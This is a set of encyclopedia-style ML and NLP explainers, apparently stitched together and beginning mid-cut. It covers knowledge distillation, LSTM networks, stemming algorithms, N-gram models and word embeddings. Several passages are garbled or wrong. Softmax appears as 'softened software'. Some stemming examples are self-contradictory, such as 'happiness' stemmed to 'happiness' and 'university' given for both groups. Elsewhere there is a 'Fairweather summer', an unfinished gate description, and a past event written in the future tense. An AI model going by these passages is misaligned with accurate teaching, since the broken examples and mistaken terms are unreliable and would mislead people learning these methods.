2018 , fig .
2 .
KD is limited to classification tasks that use softmax layer .
Sometimes the assumptions are too strict , such as in FitNets where student models may not suit constrained deployment environments .
Other approaches to model compression may therefore be preferred over KD .
However , KD continues to be a promising area of research .
In 2017 , it was adapted for multiclass object detection .
In 2018 , KD was applied to construct specialized student models for visual question answering .
Also in 2018 , Guo et al .
improved the robustness of the student network so that it resists perturbation .
In some domains , such as healthcare , DNNs are not preferred .
Decision trees are preferred since their predictions can be more easily interpreted .
KD has been used to distil DNN into decision tree and thereby provides good performance and interpretability .
Hanson and Pratt propose network pruning using biased weight decay .
They call their pruned networks minimal networks .
In the early 1990s , other pruning methods such as optimal brain damage and optimal brain surgeon were proposed .
These are early approaches to compressing a neural network model .
Knowledge distillation as an alternative was invented about two decades later .
Buciluǎ et al .
publish a paper titled Model Compression .
They present a method for “ compressing ” large , complex ensembles into smaller , faster models , usually without significant loss in performance .
They use the ensemble to label large unlabelled datasets .
They then use this labelled data to train a single model that performs as well as the ensemble .
Because it 's not easy to obtain large sets of unlabelled data , they developed an algorithm called MUNGE to generate pseudo data .
This work is limited to shallow networks .
Mimic SNN : a shallow neural network mimicking the teacher network performs as well as deep CNN .
Source : Ba and Caruana 2014 , fig .
1 .
Ba and Caruana propose the idea of a teacher - student learning method .
They show that shallow models can perform as well as deep models .
A complex teacher network ( either a deep network or an ensemble ) is trained .
Instead of using the softmax output , the logits are used to train the shallow student network .
Thus , the student network benefits from what the teacher network has learned without losing information via the software layer .
Some call this softened software .
Hinton et al .
introduce the idea of passing on the ' dark ' knowledge from an ensemble of models into a lighter , deployable model .
In a paper published in March 2015 , they explain that they 're " distilling knowledge " from the complex model .
The core idea is that models should generalize well to new data rather than optimize on training data .
Instead of using logits , they use distillation , in which the softmax is used at a higher temperature , also called " soft targets " .
They note that using logits is a special case of distillation .
FitNet uses intermediate - level hints from the teacher network .
Source : Romero et al .
2015 , fig .
1 .
FitNet aims to produce a student network that 's thinner than a teacher network while being of similar depth .
In addition to the teacher 's distilled knowledge of the final softmax layer , Fitnets also make use of intermediate - level hints from the hidden layers .
Yim et al .
propose a variation of this in 2017 by distilling knowledge from the inner product of features of two layers .
In BANs , each generation of students trains the next generation .
Source : Furlanello et al .
2018 , fig .
1 .
Furlanello et al .
show that student models parameterized similar to teacher models outperform the latter .
They call these Born - Again Networks ( BANs ) where model compression is not the goal .
Students are trained to predict correct labels plus match the teacher 's output distribution ( knowledge distillation ) .
Researchers at the Indian Institute of Science , Bangalore , propose Zero - Shot Knowledge Distillation ( ZSKD ) in which they do n't use teacher 's training dataset or a transfer dataset for distillation .
Instead , they synthesize pseudo data from the teacher 's model parameters .
They call this Data Impressions ( DI ) .
This is then used as a transfer dataset to perform distillation .
Another research group , with the aim of reducing training , shows that just 1 % of the training data can be adequate .
Relational Knowledge Distillation .
Source : Park et al .
2019 , fig .
1 .
Park et al .
look at the mutual relationships among data samples and transfer this knowledge to the student network .
Called Relational Knowledge Distillation ( RKD ) , this departs from the conventional approach of looking at individual samples .
Liu et al .
propose something similar , calling it Instance Relationship Graph ( IRG ) .
Attention network is another approach to distil relationships .
Yuan et al .
note the conventional KD can be reversed ; that is , the teacher can also learn from the student .
Another observation is that a poorly - trained teacher can improve the student .
They see KD not just as similarity across categories , but also as a regularization of soft targets .
With this understanding , they propose Teacher - free Knowledge Distillation ( Tf - KD ) in which a student model learns from itself .
LSTM node .
Source : Yan 2016 .
There are several variations in neural networks , each suitable for a particular kind of data input .
Standard and convolutional neural networks work well on static data , such as static images where entire data is analysed all at once .
However , when data is dynamic and sequentially organised , such as video frames or stock market values , a variant called Recurrent Neural Network ( RNN ) is employed .
LSTM ( Long Short - Term Memory ) is a subset of RNNs .
As the name suggests , LSTM networks have a ‘ memory ’ of the previous status of the data .
This memory is selectively tuned to remember only chosen parts of past data , even for a long time .
In applications where predictions depend on previous values of data , LSTM finds great relevance .
Keras and TensorFlow implementations of LSTM are extensively used in sequential prediction applications such as auto - response suggestions in emails , stock value predictions and speech / writing recognition .
How do LSTM networks differ from recurrent neural networks ?
RNN vs LSTM .
Source : Cheung 2018 .
In conventional feed - forward NN , all data values are considered equally important , irrespective of whether a day old or months old .
This works fine for reading image data sets to differentiate a cat from a dog .
But while dealing with time series data where every value is time stamped , the relevance of data continuously reduces with the passage of time .
RNN can handle data dependencies , but within short time intervals .
This is achieved by feeding the output of the hidden layer h(t−1 ) through a conceptual delay block back into the input of the hidden layer .
However , RNN are n’t fully effective with time - sensitive data because of the vanishing gradient problem .
LSTM networks are a type of RNN which include a ' memory cell ' that maintains information in memory for long time periods .
A set of gates is used to control when information enters the memory , when it 's output , and when it 's forgotten .
This architecture lets them learn longer - term dependencies .
To eliminate the vanishing ( or exploding ) gradient problem , the LSTM cell has a unique feature called Forget Gate .
This helps to greatly reduce the multiplicative effect of small gradients .
What is the typical node structure of LSTM ?
LSTM node structure .
Source : Cheung 2018 .
All neural networks have a chain of repeating nodes in the hidden layers .
Standard RNN nodes might have an input , output and a simple tanh function in the middle .
In LSTM , the hidden layer nodes have three interacting functions or ‘ gates ’ .
These gates protect and control the ‘ memory ’ - data stored in the cell state .
Cell - State : Works like a conveyor belt running through the network .
Value undergoes continuous changes node after node based on information added / removed by the gates .
Hidden - State : The actual output of that node for a given input .
But it is always hidden because it only enters as input at the next time step .
Input - Gate : Open only at time Here , the node decides which inputs will update the current cell state and which new candidate inputs will be added to it .
Forget - Gate : Decides what information to throw away from the cell state .
It looks at the input , previous hidden state and gives a value of between 0 - 1 for each number in the cell state .
1 – ‘ Completely retain ’ , 0 – ‘ Completely forget ’ .
Output - Gate : Sends out a filtered version of the cell state as output .
How does an LSTM network selectively ‘ forget ’ and ‘ remember ’ from past data ?
In LSTM , the cell state is retained as a continuous rolling value till it exits all the hidden layers and reaches the output .
The 3-gate structure ensures that the cell value is controlled and protected by optionally letting information through .
They are composed of a sigmoid neural net layer and a tanh operation vector for a point - wise multiplication operation .
Data is processed in batches .
For a new batch , the input layer gets inputs from the hidden state ( output layer ) of the previous batch .
Even textual values are coded and stored as numbers in the cell state for easy manipulation .
Every iteration follows these steps ( at time step t ) : Hidden state value from t-1 and input at t are sent into the node .
Forget gate removes unwanted information from the cell state using the inputs .
Input gate decides what old information to retain and what new to add to the cell state .
Cell state values also get stored as a hidden state at T. Output gate might send a filtered version of cell state either out of the hidden layers or back into a recurrent loop .
Which part of the ‘ memory ’ is short term and which is long ?
Plain vanilla RNNs are also short - term memory networks .
The output of a hidden layer node can be sent back in as input after a time lag .
So every node can retain the cell value in its ‘ memory ’ for one time step ( short term ) .
Theoretically , since the loop is recurrent , the value should remain even for long time periods .
However , the error correction that happens through back propagation keeps losing significance as it reaches the initial layers .
This causes the hidden layer node values to deviate from the desired output after repeated cycles and the memory is lost .
In LSTM , the three gates keep the cell state safe .
So the short - term memory node manages to retain its cell state throughout the network hidden layers ( long time ) .
The ' forget gate ' is the critical element which stands between different time steps within the hidden layer and ensures the control and accuracy of the cell state throughout .
Could you explain LSTM with an example ?
Take a language model trying to predict the next word based on all the previous ones - “ John has lived in France for several years .
So he speaks very good French ” .
An important step in prediction is deciding what pronoun to use based on the subject 's gender .
To predict this , the network needs to recognise the subject ‘ John ’ .
At each time step , the cell state will keep adding / updating relevant information about the subject collected from various different sentences – name , location , gender , singular or plural , etc .
The three gates will ensure only relevant information remains .
However , the next sentence may drop ‘ John ’ as subject and start talking about “ Jenny has lived in Spain since her birth .
” Now the forget gate ensures that the cell state drops the context of John and starts collecting information on Jenny .
The correct pronoun to suggest for the next sentence is ‘ she ’ .
It ’s possible that the next sentences do n't disturb the subject John and instead talk about other things , “ France is known for its … ” .
Now the LSTM network will remember the context of John for a long time and suggest using ‘ he ’ even 2 - 3 sentences later .
What are the data preparation steps before feeding to an LSTM network ?
Before fitting an LSTM model to the dataset and making a forecast , some data transformations are performed on the dataset .
Let ’s extend the word sequence prediction example .
Uni - variate input data ( word sequence in example ) is converted into an Input - > Output format from which the model can learn .
“ John has lived ” - > “ in ” , “ has lived in ” - > “ France ” and so on .
We transform the time series into a supervised learning problem with stationary data .
Observation at previous time - step becomes input to forecast at the current time - step .
LSTM models understand only numeric inputs .
So encode the word sequence and punctuation marks with numeric symbols .
Build a dictionary of words < - > symbols .
The output is a one - hot vector identifying the index of the predicted symbol in the dictionary .
Word2Vec is an optimal way of encoding symbols for vectors .
To classify images , consider every image row as a sequence of pixels .
Transform observations to have a specific scale .
Such as , rescaling data to values between -1 and 1 to conform to the default hyperbolic tangent activation function of the LSTM model .
These transforms are inverted on forecasts to return them to their original state .
How to train an LSTM model ?
LSTM models are trained to be used for sequence prediction resulting in output as a classification ( assigning categorical labels ) or a regression ( continuous real values ) .
Taking the word prediction example forward , the model must predict the next word in the sentence .
This involves multiple iterations of training the model with past data , then evaluating its accuracy on test data .
Finally , the prediction is applied to new production data .
The goal is to arrive at a final model that performs the best with respect to : Historical data available Training time spent on the model Data preparation steps and chosen algorithm configurations Desired prediction accuracy depending on the business case . First , initialize the input vector , weights and biases .
Define the nodes in the network ( 512 node LSTM network for example ) .
Feed inputs into the model .
Output is a multi - element vector of prediction probabilities for the next symbol normalized by the softmax function .
The index of the element with highest probability is the predicted index of the symbol in the reverse dictionary .
Accuracy and loss are accumulated to monitor the progress of the training .
50,000 iterations are generally enough to achieve an acceptable accuracy .
What are the major applications of the LSTM network ?
Sequential prediction of stock price based on historical stock price values Handwriting Synthesis and recognition Speech recognition using acoustic signals ( phonemes ) as input Image Captioning and recognition of unnamed images in archives Synthesised music generation from previous sequence of notes played Language translation , after the entire source language input is given Flood forecasting with daily discharge and rainfall as input data What support do TensorFlow and Keras frameworks offer to LSTM modeling ?
Keras is an open - source Python - based deep learning framework .
It has a user - friendly , modular API framework covering all common neural network building blocks such as layers , nodes , optimization functions and activation functions .
Keras is a high - level API wrapper to run on top of TensorFlow , CNTK , or Theano .
Kera models can be deployed on smartphones , online applications and JVMs .
It also supports distributed deployment of deep learning models on GPU / TPU clusters .
Keras high - level API handles the way we make models , defining layers , or setup multiple input - output models .
It supports other common utilities like dropout , batch normalization , and pooling .
TensorFlow is an end - to - end open source machine learning framework from Google .
You install the TensorFlow module in Python and use the libraries for input - output data definition , allocating test and training data sets , model building , fitting the model , optimizing for batch and epoch sizes , training the mode and finally validating accuracy scores for prediction output .
Combined use of Keras over TensorFlow is a popular option among developers , enabling fast experimentation followed by deployment .
Both frameworks have good developer community support , with source code and examples available on GitHub .
Sepp Hochreiter develops the long short - term memory ( LSTM ) .
The first results are reported in his diploma thesis .
Schmidhuber et al .
publish a type of recurrent neural network called the long short - term memory ( LSTM ) .
This overcame the vanishing gradient problem .
Standard LSTM architecture is introduced for the first time .
This architecture later became popular in applications .
" Vanilla LSTM " using backpropagation through time is published .
LSTM trained by CTC is used in a new implementation of speech recognition in Google 's software for smartphones and for Google Translate .
Apple uses LSTM for the " Quicktype " function on the iPhone and for Siri .
Amazon uses LSTM for Amazon Alexa .
The initial version of Keras deep learning framework has been released on GitHub .
In 2017 , Google released stable version 1.0.0 of TensorFlow , its machine learning framework .
In 2019 , TensorFlow gets tighter Keras integration .
Keras and TensorFlow together enable LSTM modeling .
An example of stemming .
Source : Fox 2018 .
Consider different forms of a word , such as organize , organizes , and organizing .
Consider also words that are closely related , such as democracy , democratic , and democratization .
In many applications , it may be inefficient to handle all the variations individually .
Stemming reduces them to a common form .
Algorithms that do this are called stemmers .
The output of a stemmer is called the stem , which is the root word .
Stemming may be seen as a crude heuristic process that simply chops off ends of words .
Unlike lemmatization , stemming does n't involve dictionary lookup or morphological analysis .
It 's not even required that the stem be a valid word or identical to its morphological root .
The goal is to reduce related words to the same stem .
What are some applications for stemming ?
Variations of verb forms to include for better SEO .
Source : Ives 2011 , table 3 .
Stemming is a pre - processing task that 's done before other application - specific tasks are invoked .
One application of stemming is to count the use of emotional words and perform basic sentiment analysis .
When used with a dictionary or spell checker such as Hunspell , stemmers can be used to suggest corrections when wrong spelling is encountered .
One of the first applications of stemming was in Information Retrieval ( IR ) .
Searching with the keyword " explosion " would fail to retrieve documents indexed by the word " explosives " .
Stemming solves this problem since indexing would be done using stem words .
Online search engines such as Google Search use stemming .
An analysis from 2009 of Google Search showed that some suffixes such as ' -s ' , ' -ed ' , and ' -ing ' are considered to be strongly correlated with the stems .
Suffixes ' -able ' , ' -tive ' , ' -ly ' , and ' -ness ' are considered less correlated .
For better SEO , forms that are poorly related could be added to improve search ranking .
However , Google may penalize the page if it appears unnatural .
What are some essential terms concerning stemming ?
Comparing derivational and inflectional morphemes .
Source : Liberman and Prince 1998 .
Stemming is based on the assumption that words have a structure , based on a root word and modifications of the root .
The study of words and their parts is called morphology .
In IR systems , given a word , stemming is really about finding morphological variants .
The term conflation indicates the combining of variants to a common stem .
Words may contain prefixes and suffixes , which generally are called affixes .
Stemming usually concerns itself with suffixes .
Suffixes themselves are in two types : Inflectional : Form is varied to express some grammatical feature such as singular / plural or present / past / future tense .
Inflections do n't change part of speech or meaning .
For example , ' boy ' and ' boys ' ; ' big ' , ' bigger ' and ' biggest ' .
Derivational : New forms are created from words .
New ones have a different part of speech or meaning .
For example , ' creation ' from ' create ' .
They can occur between the stem and an inflectional suffix , such as ' government ' , where ' -ment ' precedes ' -s ' .
Another example is ' rationalizations ' , where ' -al ' , ' -iz ' and ' -ation ' are derivational , and ' -s ' is inflectional .
What are the typical errors while stemming ?
Search for ' Withings ' wrongly shows items containing ' with ' .
Source : Larochelle 2014 .
Errors occur because rules fail for some special cases .
The worst error is when two different concepts conflate to the same stem .
For example , when ' Withings ' is stemmed to ' with ' on a web portal , wrong items are presented to the user .
Porter stemmer stems ' meanness ' and ' meaning ' to ' mean ' , though they relate to different concepts .
On the contrary , ' goose ' and ' geese ' are equivalent but they 're stemmed as ' goos ' and ' gees ' respectively .
Typical errors of stemming are the following : Overstemming : Happens when too much is removed .
For example , ' wander ' becomes ' wand ' ; ' news ' becomes ' new ' ; or ' universal ' , ' universe ' , ' universities ' , and ' university ' are all reduced to ' univers ' .
A better result would be ' university ' for the first two and ' university ' for the last two .
Understemming : It happens when words come from the same root but are not seen that way .
For example , ' knavish ' remains as ' knavish ' ; ' data ' and ' datum ' become ' dat ' and ' datu ' although they 're from the same root .
Misstemming : Usually not a problem unless it leads to false conflations .
For example , ' relativity ' becomes ' relative ' .
Could you give an overview of algorithms for stemming ?
Types of stemming algorithms .
Source : Singh and Gupta 2017 , fig .
1 .
Stemming algorithms broadly fall into one of two categories : Rule - based : Table lookup is a brute force approach where inflected or derived forms are mapped to stems .
For Turkish that has lots of inflected forms , this will lead to large tables .
Another approach is to apply a series of rules to strip affixes to get to the stem .
Yet another approach is to use word morphology , including part of speech .
All these approaches require particular knowledge of the language .
Statistical : By training a model , suffix - stripping rules are implicitly derived .
This is good for languages with complex morphology .
No expert knowledge of the language is needed .
Models can be trained from a lexicon , a corpus or character - based n - grams of the language 's words .
Among the rule - based stemmers are Lovins stemmer , Dawson stemmer , Porter stemmer , Paice / Husk stemmer ( aka Lancaster stemmer ) , Krovetz stemmer and Xerox stemmer .
Porter stemmer in its Snowball implementation is commonly used .
Lancaster stemmer is more aggressive , leading to overstemming .
Could you explain Porter 's algorithm ?
Computing word measure , resulting in m=4 .
Source : Snowball 2019a .
Porter stemmer applies a set of rules in five steps involving 51 suffixes and 60 rules .
Each rule is given by the form \((condition ) \ , S1 \to S2\ ) , where S1 and S2 are suffixes .
If the condition is matched or null , S1 is replaced with S2 .
When multiple rules are applicable in a given sub - step , only the rule with the longest S1 is obeyed .
For example , step-1a has four rules with null conditions : $ $ SSES \to SS\\IES \to I\\SS \to SS\\S \to$$ In this case , ' caresses ' becomes ' caress ' since the first rule gives the longest match for S1 ; ' caress ' remains caress ( third rule ) ; ' cares ' becomes ' care ' ( fourth rule ) .
Porter also defined the generic structure of a word as \(C ^{m } [ V]\ ) , where [ ] denotes arbitrary presence , C is one or more consonants , V is one or more vowels and m is the word 's measure .
A measure is computed on what precedes the rule 's suffix .
We could use it to ignore rules when the stem is too short .
For example , the following rule changes ' agreed ' to ' agree ' ( m=1 ) but retains ' feed ' as ' feed ' ( m=0 ) : \((m>0 ) \ , EED \to EE\ ) What are the common approaches used by stochastic stemmers ?
One approach is to segment words into roots and suffixes and select the best possible segmentation .
This is based on counts of letter successor varieties .
The Minimum Description Length ( MDL ) stemmer is also about finding the optimal split between root and suffix .
MDL was found to be computationally intensive and gave 83 % accuracy for both English and French .
Another approach is to discover suffixes based on their frequencies .
Frequencies are adjusted for partial suffixes so that ' -ng ' does n't include ' -ing ' .
The Hidden Markov Model ( HMM ) has been applied to stemming .
Word letters are considered as hidden states and the transition from a root state to a suffix state is taken as the split point .
Yet Another Suffix Stripper ( YASS ) treats stemming as a word clustering problem .
Two words having long common prefixes are considered similar .
Threshold value must be selected carefully to produce meaningful clusters .
YASS was shown to perform similar to rule - based stemmers .
Other approaches make use of graphs with weighted edges , word co - occurrences , distribution similarity , and queries along with context .
How is the performance of stemming ?
Algorithmic stemmers are typically fast .
For example , a million words can be stemmed in 6 seconds on a 500 MHz personal computer .
It 's more efficient not to use a dictionary .
Rather than complicating the algorithm , it 's simpler to ignore irregular forms .
Lemmatization uses a dictionary such as WordNet to get to the correct base forms .
However , lemmatization has its limitations too .
For example , ' happiness ' and ' happiness ' are left unchanged while the Porter stemmer stems them correctly to ' happiness ' .
In IR systems , stemming reduces storage requirements by over 50 % since we store stems rather than full terms .
What are some tools to do stemming ?
For a quick demo of stemming , online tools are available : JavaScript - based Porter Stemmer : Highlights removed suffixes .
JavaScript - based Snowball Stemmer : Includes open source code and unit tests .
NLTK - based Stemmers : Two sources are text-processing.com and TextAnalysisOnline .
They support Porter , Lancaster and Snowball stemmers .
These tools also include lemmatization .
For developers , R has the corpus package for stemming .
This is based on snowball .
This has support for multiple natural languages .
In Python , NLTK and TextBlob are two packages that support stemming .
Martin Porter has shared a list of many language implementations of the Porter stemmer .
For test purpose , he also shares a sample vocabulary and the expected output .
Julie Beth Lovins of MIT publishes details of one of the earliest stemmers in the context of information retrieval .
The system has 10,000 documents in the field of materials science and engineering .
The algorithm has two phases : ( a ) remove the longest possible ending to obtain the stem ; ( b ) handle spelling exceptions .
For example , ' absorption ' becomes ' absorpt ' and ' absorbing ' becomes ' absorb ' in phase-1 ; phase-2 matches ' absorpt ' and ' absorb ' via recoding .
Martin Porter invented an algorithmic stemmer based on rules for suffix stripping .
The algorithm runs in five steps .
He finds that in a vocabulary of 10,000 words , the stemmer gives a size reduction of 33 % , with most reduction coming from step-1 that deals with plurals and past participles .
The stemmer is implemented in BCPL .
This later became known as Porter stemmer .
Chris Paice at Lancaster University invented a new stemmer that iteratively removes suffixes based on matching rules .
Some rules replace suffixes so that spelling exceptions do n't occur .
This stemmer is usually called Paice / Husk stemmer or Lancaster stemmer .
Comparing the performance of three different stemmers .
Source : Paice 1994 , fig .
3 .
Stemmers are often evaluated based on their effectiveness towards information retrieval .
This , however , does not help in improving the stemmer .
To solve this , Chris Paice proposes using predefined concept groups with sample words .
The method counts overstemming and understemming errors .
It then computes the metrics overstemming index ( OI ) , understemming index ( UI ) , stemming weight and error rate relative to truncation ( ERRT ) .
These help us compare the performance of different stemmers .
Martin Porter finds that many implementations of Porter stemmer contain errors .
He also notes that the Kraaij - Pohlmann stemmer for Dutch is released as open source ANSI C software but lacks a description of the algorithm .
To solve these issues , Porter invented Snowball , a system in which rules can be expressed in a natural way .
Then a compiler transforms the description into C code .
The Snowball implementation for English is also called Porter2 stemmer .
By 2019 , Snowball will support more than a dozen natural languages with code generated in C , Java , Python , Go , Rust , C # , and more .
State transition for the Fairweather summer .
Source : Mitosystems 2014b , fig .
1 .
John Fairweather files a patent application that treats stemming as a shortest - path problem .
Words are modelled in the form ` [ Prefix ] Root { [ Infix ] Root } [ Suffix ] ` , where [ ] is zero or more occurrences , { } is one or more occurrences .
The cost of each path is computed from the word component and the number of characters in it .
The algorithm is language independent .
Ahmet Uyar of Mersin University , Turkey , investigates stemming mechanisms used by Google .
Using 18,000 different words , he finds that Google uses a document - based algorithm .
Documents are indexed based on word forms that are semantically strongly correlated .
This includes singular and plural forms but rarely suffixes of the type ' -able ' or ' -tively ' .
Unigrams , bigrams and trigrams .
Source : Mehmood 2019 .
Given a sequence of N-1 words , an N - gram model predicts the most probable word that might follow this sequence .
It 's a probabilistic model that 's trained on a corpus of text .
Such a model is useful in many NLP applications , including speech recognition , machine translation and predictive text input .
An N - gram model is built by counting how often word sequences occur in corpus text and then estimating the probabilities .
Since a simple N - gram model has limitations , improvements are often made via smoothing , interpolation and backoff .
An N - gram model is one type of a Language Model ( LM ) , which is about finding the probability of distribution over word sequences .
Could you explain N - gram models with an example ?
Introduction to N - gram models .
Source : Jurafsky 2019 .
Consider two sentences : " There was heavy rain " vs. " There was heavy flood " .
From experience , we know that the former sentence sounds better .
An N - gram model will tell us that " heavy rain " occurs much more often than " heavy flood " in the training corpus .
Thus , the first sentence is more probable and will be selected by the model .
A model that simply relies on how often a word occurs without looking at previous words is called unigram .
If a model considers only the previous word to predict the current word , then it 's called bigram .
If two previous words are considered , then it 's a trigram model .
An n - gram model for the above example would calculate the following probability : P('There was heavy rain ' ) = P('There ' , ' was ' , ' heavy ' , ' rain ' ) = P('There')P('was'|'There')P('heavy'|'There was')P('rain'|'There was heavy ' ) Since it 's impractical to calculate these conditional probabilities , using Markov assumption , we approximate this to a bigram model : P('There was heavy rain ' ) ~ P('There')P('was'|'There')P('heavy'|'was')P('rain'|'heavy ' ) What are typical applications of N - gram models ?
A trigram model generates more natural sentences .
Source : Jurafsky and Martin 2009 , fig .
4.4 .
In speech recognition , input may be noisy and this can lead to wrong speech - to - text conversions .
N - gram models can correct this based on their knowledge of the probabilities .
Likewise , N - gram models are used in machine translation to produce more natural sentences in the target language .
When correcting for spelling errors , sometimes dictionary lookups will not help .
For example , in the phrase " in about fifteen minutes " the word ' minuets ' is a valid dictionary word but it 's incorrect in this context .
N - gram models can correct such errors .
N - gram models are usually at word level .
It 's also been used at character level to do stemming , that is , separate the root word from the suffix .
By looking at N - gram statistics , we could also classify languages or differentiate between US and UK spellings .
For example , ' sz ' is common in Czech ; ' gb ' and ' kp ' are common in Igbo .
In general , many NLP applications benefit from N - gram models , including part - of - speech tagging , natural language generation , word similarity , sentiment extraction and predictive text input .
How do we evaluate an N - gram model ?
Perplexity helps us compare different N - gram models .
Source : Ablimit et al .
2015 , slide 45 .
The best way to evaluate a model is to check how well it predicts in end - to - end application testing .
This approach is called extrinsic evaluation , but it 's time - consuming and expensive .
An alternative approach is to define a suitable metric and evaluate it independent of the application .
This is called intrinsic evaluation .
This does n't guarantee application performance , but it 's a quick first step to check algorithmic performance .
A common metric is to use perplexity , often written as PP .
Given a test set \(W = w_1 w_2 \dots w_n\ ) , \(PP(W ) = P(w_1 w_2 \dots w_n)^{-1 / N}\ ) .
Because of the inverse relationship with probability , minimizing perplexity implies maximizing the test set probability .
Perplexity can also be related to the concept of entropy in information theory .
It 's important in any N - gram model to include markers at the start and end of sentences .
This ensures that the total probability of the whole language sums to one .
However , all calculations should include the end markers but not the start markers in the count of word tokens .
What is smoothing in the context of N - gram modelling ?
It 's quite possible that some word sequences occur in test data that were never seen during training .
When this happens , the probability of the sequence equals zero .
Evaluation is also difficult since perplexity metrics become infinite .
The usual way to solve this is to give non - zero counts to N - grams that are seen in testing but not in training .
We ca n't just add 1 to all the zero counts since the overall probability distribution will not be normalized .
Instead , we remove some probability mass from non - zero counts ( called discounting ) and add them to the zero counts .
The overall process is called smoothing .
The simplest technique is Laplace Smoothing where we add 1 to all counts , including non - zero counts .
An alternative is to add k , with k tuned using test data .
Other techniques include Good - Turing Discounting , Witten - Bell Discounting , and Kneser - Ney Smoothing .
All of these try to estimate the number of things never seen based on the number of things seen once .
Kneser - Ney Smoothing provides a good baseline and it 's based on absolute discounting .
How do backoff and interpolation techniques help N - gram models ?
Smoothing solves the zero - count problem , but there are techniques to help us better estimate the probabilities of unseen n - gram sequences .
Suppose we want to get trigram probability of a certain word sequence that never occurs .
We can estimate this using the bigram probability .
If the latter is also not possible , we use unigram probability .
This technique is called backoff .
One such technique that 's popular is called Katz Backoff .
Interpolation is another technique in which we can estimate an n - gram probability based on a linear combination of all lower - order probabilities .
For instance , a 4-gram probability can be estimated using a combination of trigram , bigram and unigram probabilities .
The weight in which these are combined can also be estimated by reserving some part of the corpus for this purpose .
While backoff considers each lower order one at a time , interpolation considers all the lower order probabilities together .
What are some limitations of N - gram models ?
A model trained on the works of Shakespeare will not give good predictions when applied to another genre .
We need to therefore , ensure that the training corpus looks similar to the test corpus .
There 's also the problem of Out of Vocabulary ( OOV ) words .
These are words that appear during testing but not in training .
One way to solve this is to start with a fixed vocabulary and convert OOV words in training to ` UNK ` pseudo - words .
In one study , when applied to sentiment analysis , a bigram model outperformed a unigram model but the number of features doubled .
Thus , scaling N - gram models to larger datasets or moving to a higher N needs good feature selection techniques .
N - gram models poorly capture longer - distance context .
It 's been shown that after 6-grams , performance gains are limited .
Other language models , such as cache LM , topic - based LM and latent semantic indexing do better .
What software tools are available to do N - gram modelling ?
R has a few useful packages , including ngram , TM , tau and RWeka .
Package tidytext has functions to do N - gram analysis .
In Python , NTLK has the function ` nltk.utils.ngrams ( ) ` .
A more comprehensive package is nltk.lm .
Outside NLTK , the ngram package can compute n - gram string similarity .
Written in C++ and open source , SRILM is a useful toolkit for building language models .
This includes the tool ` ngram - format ` that can read or write N - grams models in the popular ARPA backoff format , which was invented by Doug Paul at MIT Lincoln Labs .
A demo of an N - gram predictive model implemented in R Shiny can be tried out online .
Ngram Viewer is a useful research tool by Google .
It 's based on material collected for Google Books .
Given a sequence of words , it shows how the N - gram counts have changed over the years .
A bigram model of five letters due to Shannon .
Source : Shannon 1948 , fig .
4 .
In his paper titled A Mathematical Theory of Communication , Claude Shannon describes an example in which the next letter depends on the previous one based on defined probabilities .
This is an application of the Markov process to natural languages .
Although smoothing techniques can be traced back to Lidstone ( 1920 ) , or even earlier to Laplace ( 18th century ) , an early application of smoothing to n - gram models for NLP is by Jelinek and Mercer ( 1980 ) .
A better smoothing technique is due to Katz ( 1987 ) .
More smoothing techniques were proposed in the 1990s .
Jelinek and team at the IBM Research Division adapted a trigram LM to match the current document better .
By caching a recent history of words , they propose the Cache Trigram Language Model ( CTLM ) .
They show that for long text of 500 - 800 words , there 's a drop in error rate of about 24 % .
N - gram models look at the preceding ( n-1 ) words , but for larger n , there 's a data sparsity problem .
Huang et al .
propose a skipping n - gram model in which some preceding words may be ignored or skipped .
For example , in the phrase " Show John a good time " , the last word would be predicted based on P(time|Show a good ) rather than P(time|Show John a good ) .
Many such skipping models were proposed through the 1990s .
Kneser and Ney propose improved backoff and discounting .
It 's based on the concept of absolute discounting in which a small constant is removed from all non - zero counts .
Kneser - Ney Smoothing improves on absolute discounting by estimating the count of a word in a new context based on the number of different contexts in which the word has already appeared .
Chen and Goodman at Harvard University give an empirical comparison of different smoothing techniques .
Other papers from them around the late 1990s became influential in this area of research .
Due to their work , Interpolated Kneser - Ney has become a popular language model .
Version 0.99 of the SRILM toolkit is open source for public use .
Earlier versions of SRILM can be traced back to 1995 .
Version 1.00 was released in June 2000 .
Version 1.7.3 comes out in September 2019 .
Researchers at Carnegie Mellon University apply N - grams to model whole - genome protein sequences .
Their research triggers further application of N - gram models to computational biology .
For the benefit of research in linguistics , Google releases a dataset of counts of about a billion five - word sequences that appear at least 40 times in a text of trillion words .
The dataset is available via the Linguistic Data Consortium ( LDC ) .
Books on Wikipedia are clustered by genre in just two dimensions .
Source : Koehrsen 2018 .
Word embedding is simply a vector representation of a word , with the vector containing real numbers .
Since languages typically contain at least tens of thousands of words , simple binary word vectors can become impractical due to the high number of dimensions .
Word embeddings solve this problem by providing dense representations of words in a low - dimensional vector space .
Since mid-2010s , word embedding has been applied to neural network - based NLP tasks .
Among the well - known embeddings are word2vec ( Google ) , GloVe ( Stanford ) and FastText ( Facebook ) .
Why do we need word embeddings ?
Word embeddings reduce the number of dimensions .
Source : Goldberg 2015 , fig .
1 .
Consider an example where we have to encode " the dog DET " , which is about ' dog ' , its previous word ' the ' and whose part of speech is determiner ( DET ) .
If we represent every word and every part of speech in its own dimension , we would require a high - dimensional vector since our vocabulary will have lots of words .
The vector will mostly be zeros except in three places that represent ' dog ' , ' the ' and ' DET ' .
Called One - Hot Encoding , this is a sparse representation .
Instead , word embeddings give a dense representation in a lower - dimensional space .
Each entity gets a unique representation in this vector space .
As shown in the figure , both words have six dimensions each and the part of speech has four dimensions .
The entire vector representation is now only 16 dimensions .
This makes it practical for further processing .
More importantly , word embeddings capture similarities .
For example , even if the word ' cat ' is not seen during training , its embedding would be similar to that of ' dog ' .
Likewise , different tenses of the same verb are correlated .
Is word embedding related to distributional semantics ?
Similar words are near one another in the vector space .
Source : Lynn 2018 .
Yes .
The term " word embedding " has been popularized by the deep learning community .
In computational linguistics , the more preferred term is the Distributional Semantic Model ( DSM ) , which comes from the theory of distributional semantics .
Other equivalent terms include distributed representation , semantic vector space or word space .
Essentially , words are not represented as a single number or symbol .
Rather , the representation is distributed in a vector space of many dimensions .
The notion of semantics emerges because two words that are close to each other in the vector space are somehow semantically related .
Similar words form clusters in the vector space .
How can we extract semantic relationships captured within word embeddings ?
Word embeddings capture useful relationships .
Source : Lynn 2018 .
Word embeddings are produced in an unsupervised manner .
We do n't inform the model anything about syntactic or semantic relationships between words .
Yet , word embeddings seem to capture these relationships .
For example , country names and their capital cities form a relationship .
Relations due to gender or verb tense of words are other examples .
